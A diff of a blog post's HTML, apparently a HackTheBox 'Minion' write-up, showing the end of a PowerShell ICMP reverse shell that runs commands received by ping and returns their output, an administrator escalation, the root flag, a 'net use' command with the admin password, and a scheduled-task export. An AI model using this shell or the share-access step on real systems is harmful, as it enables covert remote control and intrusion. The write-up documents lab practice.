class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">NetworkInformation</span><span class="p">.</span><span class="n">Ping</span><span class="p">;</span> <span class="nv">$po</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">NetworkInformation</span><span class="p">.</span><span class="n">PingOptions</span><span class="p">;</span> <span class="nv">$po</span><span class="p">.</span><span class="n">DontFragment</span><span class="p">=</span><span class="nv">$true</span><span class="p">;</span> <span class="k">function</span> <span class="n">s</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$ic</span><span class="p">.</span><span class="n">Send</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="n">5000</span><span class="p">,(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$b</span><span class="p">),</span><span class="nv">$po</span><span class="p">)</span> <span class="p">};</span> <span class="k">function</span> <span class="n">p</span> <span class="p">{</span> <span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="s1">&#39;[P$] &#39;</span><span class="p">,$(</span><span class="n">whoami</span><span class="p">),</span><span class="s1">&#39;@&#39;</span><span class="p">,</span><span class="nv">$env:computername</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,$((</span><span class="nb">gi </span><span class="nv">$pwd</span><span class="p">).</span><span class="n">Name</span><span class="p">),</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span> <span class="p">};</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$true</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$r</span> <span class="p">=</span> <span class="n">s</span><span class="p">(</span><span class="n">p</span><span class="p">);</span> <span class="k">if</span> <span class="p">(!</span><span class="nv">$r</span><span class="p">.</span><span class="n">Buffer</span><span class="p">)</span> <span class="p">{</span> <span class="k">continue</span><span class="p">;</span> <span class="p">};</span> <span class="nv">$rs</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$r</span><span class="p">.</span><span class="n">Buffer</span><span class="p">);</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$rs</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="n">8</span><span class="p">)</span> <span class="o">-ne</span> <span class="nv">$id</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span> <span class="p">};</span> <span class="k">try</span> <span class="p">{</span> <span class="nv">$rt</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="n">-Command</span> <span class="nv">$rs</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="n">8</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-String</span><span class="p">);</span> <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> <span class="nv">$rt</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">Exception</span><span class="p">|</span><span class="nb">out-string</span><span class="p">)</span> <span class="p">};</span> <span class="nv">$i</span><span class="p">=</span><span class="n">0</span><span class="p">;</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$rt</span><span class="p">.</span><span class="n">length</span><span class="p">-</span><span class="n">110</span><span class="p">)</span> <span class="p">{</span> <span class="n">s</span><span class="p">(</span><span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$rt</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span><span class="n">110</span><span class="p">)));</span> <span class="nv">$i</span> <span class="p">-=</span> <span class="p">-</span><span class="n">110</span><span class="p">;</span> <span class="p">};</span> <span class="n">s</span><span class="p">(</span><span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$rt</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">)));</span> <span class="p">}</span> <span class="p">}</span></span></span></code></pre></div></div></p>
 
 <p>Again, I have automated this procedure inside my script. So getting admin is a simple as typing &ldquo;ADMIN&rdquo; :P
-<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">decoder</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="n">ADMIN</span>
-<span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Documents</span><span class="p">&gt;</span> <span class="n">whoami</span>
-<span class="n">minion</span><span class="p">\</span><span class="n">administrator</span>
-<span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">cd </span><span class="p">..\</span><span class="n">Desktop</span>
-<span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">ls
-</span><span class="nb"></span>
-
-    <span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span>
-
-
-<span class="n">Mode</span>                <span class="n">LastWriteTime</span>     <span class="n">Length</span> <span class="n">Name</span>                              
-<span class="p">----</span>                <span class="p">-------------</span>     <span class="p">------</span> <span class="p">----</span>                              
-<span class="n">-a</span><span class="p">---</span>         <span class="n">9</span><span class="p">/</span><span class="n">26</span><span class="p">/</span><span class="n">2017</span>   <span class="n">6</span><span class="err">:</span><span class="n">18</span> <span class="n">AM</span>     <span class="n">386479</span> <span class="n">root</span><span class="p">.</span><span class="n">exe</span>                          
-<span class="n">-a</span><span class="p">---</span>         <span class="n">8</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2017</span>  <span class="n">12</span><span class="err">:</span><span class="n">32</span> <span class="n">AM</span>         <span class="n">76</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span>
-
-<span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">cat </span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
-<span class="k">In</span> <span class="n">order</span> <span class="n">to</span> <span class="n">get</span> <span class="n">the</span> <span class="n">flag</span> <span class="n">you</span> <span class="n">have</span> <span class="n">to</span> <span class="n">launch</span> <span class="n">root</span><span class="p">.</span><span class="n">exe</span> <span class="n">located</span> <span class="k">in</span> <span class="n">this</span> <span class="n">folder</span><span class="p">!</span></code></pre></div></div></p>
+<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">decoder</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="n">ADMIN</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Documents</span><span class="p">&gt;</span> <span class="n">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="n">minion</span><span class="p">\</span><span class="n">administrator</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">cd </span><span class="p">..\</span><span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">ls
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Mode</span>                <span class="n">LastWriteTime</span>     <span class="n">Length</span> <span class="n">Name</span>                              
+</span></span><span class="line"><span class="cl"><span class="p">----</span>                <span class="p">-------------</span>     <span class="p">------</span> <span class="p">----</span>                              
+</span></span><span class="line"><span class="cl"><span class="n">-a</span><span class="p">---</span>         <span class="n">9</span><span class="p">/</span><span class="n">26</span><span class="p">/</span><span class="n">2017</span>   <span class="n">6</span><span class="err">:</span><span class="n">18</span> <span class="n">AM</span>     <span class="n">386479</span> <span class="n">root</span><span class="p">.</span><span class="n">exe</span>                          
+</span></span><span class="line"><span class="cl"><span class="n">-a</span><span class="p">---</span>         <span class="n">8</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2017</span>  <span class="n">12</span><span class="err">:</span><span class="n">32</span> <span class="n">AM</span>         <span class="n">76</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">cat </span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="k">In</span> <span class="n">order</span> <span class="n">to</span> <span class="n">get</span> <span class="n">the</span> <span class="n">flag</span> <span class="n">you</span> <span class="n">have</span> <span class="n">to</span> <span class="n">launch</span> <span class="n">root</span><span class="p">.</span><span class="n">exe</span> <span class="n">located</span> <span class="k">in</span> <span class="n">this</span> <span class="n">folder</span><span class="p">!</span></span></span></code></pre></div></div></p>
 
 <p>Well, we can get the root flag by executing .\root.exe or C:\Users\Administrator\Desktop\root.exe. If this doesn&rsquo;t print the flag try using cmd (sometimes I had problems to print the flag and the cmd way is what worked for me):
-<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">root</span><span class="p">.</span><span class="n">exe</span>
-<span class="n">25afc18b756db15085428015928a1cf1</span>
-
-<span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">root</span><span class="p">.</span><span class="n">exe</span>
-<span class="n">25afc18b756db15085428015928a1cf1</span>
-
-<span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="s1">&#39;root.exe&#39;</span>
-<span class="n">25afc18b756db15085428015928a1cf1</span></code></pre></div></div></p>
+<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">root</span><span class="p">.</span><span class="n">exe</span>
+</span></span><span class="line"><span class="cl"><span class="n">25afc18b756db15085428015928a1cf1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">root</span><span class="p">.</span><span class="n">exe</span>
+</span></span><span class="line"><span class="cl"><span class="n">25afc18b756db15085428015928a1cf1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="s1">&#39;root.exe&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">25afc18b756db15085428015928a1cf1</span></span></span></code></pre></div></div></p>
 
 <p>The reason for an executable root.exe instead of a root.txt is to force us to impersonate the Administrator instead of doing, for example, something like this:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">net use I: \\10.10.10.57\C$  /user:administrator &#34;1234test&#34;
-</span><span class="go">type I:\Users\Administrator\Desktop\root.txt
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">net use I: \\10.10.10.57\C$  /user:administrator &#34;1234test&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">type I:\Users\Administrator\Desktop\root.txt
+</span></span></span></code></pre></div></div></p>
 
 <p>Now that we are admins, let&rsquo;s explore a little that scheduled task:
-<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">cat </span><span class="n">c:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">log</span><span class="p">.</span><span class="n">txt</span>
-<span class="p">...</span>
-<span class="n">Wed</span> <span class="n">09</span><span class="p">/</span><span class="n">06</span><span class="p">/</span><span class="n">2017</span> <span class="n">17</span><span class="err">:</span><span class="n">41</span><span class="err">:</span><span class="n">16</span><span class="p">.</span><span class="n">01</span> <span class="nb">start </span><span class="n">job</span> 
-<span class="n">Wed</span> <span class="n">09</span><span class="p">/</span><span class="n">06</span><span class="p">/</span><span class="n">2017</span> <span class="n">17</span><span class="err">:</span><span class="n">46</span><span class="err">:</span><span class="n">16</span><span class="p">.</span><span class="n">01</span> <span class="nb">start </span><span class="n">job</span> 
-<span class="n">Wed</span> <span class="n">09</span><span class="p">/</span><span class="n">06</span><span class="p">/</span><span class="n">2017</span> <span class="n">17</span><span class="err">:</span><span class="n">51</span><span class="err">:</span><span class="n">16</span><span class="p">.</span><span class="n">03</span> <span class="nb">start </span><span class="n">job</span> 
-<span class="p">...</span>
-
-<span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">Where </span><span class="n">State</span> <span class="o">-ne</span> <span class="s2">&#34;Disabled&#34;</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">TaskName</span>
-<span class="p">...</span>
-<span class="n">delete_logs</span>
-<span class="p">...</span>
-
-<span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">Where </span><span class="n">TaskName</span> <span class="o">-eq</span> <span class="s2">&#34;delete_logs&#34;</span> <span class="p">|</span> <span class="nb">Get-ScheduledTaskInfo</span>
-<span class="n">LastRunTime</span>        <span class="err">:</span> <span class="n">10</span><span class="p">/</span><span class="n">14</span><span class="p">/</span><span class="n">2017</span> <span class="n">12</span><span class="err">:</span><span class="n">11</span><span class="err">:</span><span class="n">11</span> <span class="n">AM</span>
-<span class="n">LastTaskResult</span>     <span class="err">:</span> <span class="n">0</span>
-<span class="n">NextRunTime</span>        <span class="err">:</span> <span class="n">10</span><span class="p">/</span><span class="n">14</span><span class="p">/</span><span class="n">2017</span> <span class="n">12</span><span class="err">:</span><span class="n">16</span><span class="err">:</span><span class="n">16</span> <span class="n">AM</span>
-<span class="n">NumberOfMissedRuns</span> <span class="err">:</span> <span class="n">0</span>
-<span class="n">TaskName</span>           <span class="err">:</span> <span class="n">delete_logs</span>
-<span class="n">TaskPath</span>           <span class="err">:</span> <span class="p">\</span>
-<span class="n">PSComputerName</span>     <span class="err">:</span> 
-
-<span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">Export-ScheduledTask</span> <span class="n">-Taskname</span> <span class="n">delete_logs</span>
-<span class="p">&lt;</span><span class="k">?</span><span class="n">xml</span> <span class="n">version</span><span class="p">=</span><span class="s2">&#34;1.0&#34;</span> <span class="n">encoding</span><span class="p">=</span><span class="s2">&#34;UTF-16&#34;</span><span class="p">?&gt;</span>
-<span class="p">&lt;</span><span class="n">Task</span> <span class="n">version</span><span class="p">=</span><span class="s2">&#34;1.2&#34;</span> <span class="n">xmlns</span><span class="p">=</span><span class="s2">&#34;http://schemas.microsoft.com/windows/2004/02/mit/task&#34;</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="n">RegistrationInfo</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">Date</span><span class="p">&gt;</span><span class="n">2017</span><span class="p">-</span><span class="n">08</span><span class="p">-</span><span class="n">10T16</span><span class="err">:</span><span class="n">36</span><span class="err">:</span><span class="n">36</span><span class="p">.</span><span class="n">2851262</span><span class="p">&lt;/</span><span class="n">Date</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">Author</span><span class="p">&gt;</span><span class="n">WIN</span><span class="p">-</span><span class="n">2RTO3C7989S</span><span class="p">\</span><span class="n">Administrator</span><span class="p">&lt;/</span><span class="n">Author</span><span class="p">&gt;</span>
-  <span class="p">&lt;/</span><span class="n">RegistrationInfo</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="n">Triggers</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">CalendarTrigger</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="n">Repetition</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="n">Interval</span><span class="p">&gt;</span><span class="n">PT5M</span><span class="p">&lt;/</span><span class="n">Interval</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="n">Duration</span><span class="p">&gt;</span><span class="n">P1D</span><span class="p">&lt;/</span><span class="n">Duration</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="n">StopAtDurationEnd</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">StopAtDurationEnd</span><span class="p">&gt;</span>
-      <span class="p">&lt;/</span><span class="n">Repetition</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="n">StartBoundary</span><span class="p">&gt;</span><span class="n">2017</span><span class="p">-</span><span class="n">08</span><span class="p">-</span><span class="n">10T16</span><span class="err">:</span><span class="n">36</span><span class="err">:</span><span class="n">16</span><span class="p">.</span><span class="n">9925913</span><span class="p">&lt;/</span><span class="n">StartBoundary</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="n">Enabled</span><span class="p">&gt;</span><span class="n">true</span><span class="p">&lt;/</span><span class="n">Enabled</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="n">ScheduleByDay</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="n">DaysInterval</span><span class="p">&gt;</span><span class="n">1</span><span class="p">&lt;/</span><span class="n">DaysInterval</span><span class="p">&gt;</span>
-      <span class="p">&lt;/</span><span class="n">ScheduleByDay</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="n">CalendarTrigger</span><span class="p">&gt;</span>
-  <span class="p">&lt;/</span><span class="n">Triggers</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="n">Principals</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">Principal</span> <span class="n">id</span><span class="p">=</span><span class="s2">&#34;Author&#34;</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="n">RunLevel</span><span class="p">&gt;</span><span class="n">HighestAvailable</span><span class="p">&lt;/</span><span class="n">RunLevel</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="n">UserId</span><span class="p">&gt;</span><span class="n">decoder</span><span class="p">&lt;/</span><span class="n">UserId</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="n">LogonType</span><span class="p">&gt;</span><span class="n">Password</span><span class="p">&lt;/</span><span class="n">LogonType</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="n">Principal</span><span class="p">&gt;</span>
-  <span class="p">&lt;/</span><span class="n">Principals</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="n">Settings</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">MultipleInstancesPolicy</span><span class="p">&gt;</span><span class="n">Parallel</span><span class="p">&lt;/</span><span class="n">MultipleInstancesPolicy</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">DisallowStartIfOnBatteries</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">DisallowStartIfOnBatteries</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">StopIfGoingOnBatteries</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">StopIfGoingOnBatteries</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">AllowHardTerminate</span><span class="p">&gt;</span><span class="n">true</span><span class="p">&lt;/</span><span class="n">AllowHardTerminate</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">StartWhenAvailable</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">StartWhenAvailable</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">RunOnlyIfNetworkAvailable</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">RunOnlyIfNetworkAvailable</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">IdleSettings</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="n">StopOnIdleEnd</span><span class="p">&gt;</span><span class="n">true</span><span class="p">&lt;/</span><span class="n">StopOnIdleEnd</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="n">RestartOnIdle</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">RestartOnIdle</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="n">IdleSettings</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">AllowStartOnDemand</span><span class="p">&gt;</span><span class="n">true</span><span class="p">&lt;/</span><span class="n">AllowStartOnDemand</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">Enabled</span><span class="p">&gt;</span><span class="n">true</span><span class="p">&lt;/</span><span class="n">Enabled</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">Hidden</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">Hidden</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">RunOnlyIfIdle</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">RunOnlyIfIdle</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">WakeToRun</span><span class="p">&gt;</span><span class="n">false</span><span class="p">&lt;/</span><span class="n">WakeToRun</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">ExecutionTimeLimit</span><span class="p">&gt;</span><span class="n">PT1H</span><span class="p">&lt;/</span><span class="n">ExecutionTimeLimit</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">Priority</span><span class="p">&gt;</span><span class="n">7</span><span class="p">&lt;/</span><span class="n">Priority</span><span class="p">&gt;</span>
-  <span class="p">&lt;/</span><span class="n">Settings</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="n">Actions</span> <span class="n">Context</span><span class="p">=</span><span class="s2">&#34;Author&#34;</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="n">Exec</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="n">Command</span><span class="p">&gt;</span><span class="n">C:</span><span class="p">\</span><span class="n">sysadmscripts</span><span class="p">\</span><span class="n">del_logs</span><span class="p">.</span><span class="n">bat</span><span class="p">&lt;/</span><span class="n">Command</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="n">Exec</span><span class="p">&gt;</span>
-  <span class="p">&lt;/</span><span class="n">Actions</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="n">Task</span><span class="p">&gt;</span></code></pre></div></div></p>
+<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">cat </span><span class="n">c:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">log</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">Wed</span> <span class="n">09</span><span class="p">/</span><span class="n">06</span><span class="p">/</span><span class="n">2017</span> <span class="n">17</span><span class="err">:</span><span class="n">41</span><span class="err">:</span><span class="n">16</span><span class="p">.</span><span class="n">01</span> <span class="nb">start </span><span class="n">job</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Wed</span> <span class="n">09</span><span class="p">/</span><span class="n">06</span><span class="p">/</span><span class="n">2017</span> <span class="n">17</span><span class="err">:</span><span class="n">46</span><span class="err">:</span><span class="n">16</span><span class="p">.</span><span class="n">01</span> <span class="nb">start </span><span class="n">job</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Wed</span> <span class="n">09</span><span class="p">/</span><span class="n">06</span><span class="p">/</span><span class="n">2017</span> <span class="n">17</span><span class="err">:</span><span class="n">51</span><span class="err">:</span><span class="n">16</span><span class="p">.</span><span class="n">03</span> <span class="nb">start </span><span class="n">job</span> 
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">Where </span><span class="n">State</span> <span class="o">-ne</span> <span class="s2">&#34;Disabled&#34;</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">TaskName</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete_logs</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">administrator</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">Where </span><span class="n">TaskName</span> <span class="o">-eq</span> <span class="s2">&#34;delete_logs&#34;</span> <span class="p">|</span> <span class="nb">Get-ScheduledTaskInfo</span>
+</span></span><span class="line"><span class="cl"><span class="n">LastRunTime</span>        <span class="err">:</span> <span class="n">10</span><span class="p">/</span><span class="n">14</span><span class="p">/</span><span class="n">2017</span> <span class="n">12</span><span class="err">:</span><span class="n">11</span><span class="err">:</span><span class="n">11</span> <span class="n">AM</span>
+</span></span><span class="line"><span class="cl"><span class="n">LastTaskResult</span>     <span class="err">:</span> <span class="n">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">NextRunTime</span>        <span class="err">:</span> <span class="n">10</span><span class="p">/</span><span class="n">14</span><span class="p">/</span><span class="n">2017</span> <span class="n">12</span><span class="err">:</span><span class="n">16</span><span class="err">:</span><span class="n">16</span> <span class="n">AM</span>
+</span></span><span class="line"><span class="cl"><span class="n">NumberOfMissedRuns</span> <span class="err">:</span> <span class="n">0</span>
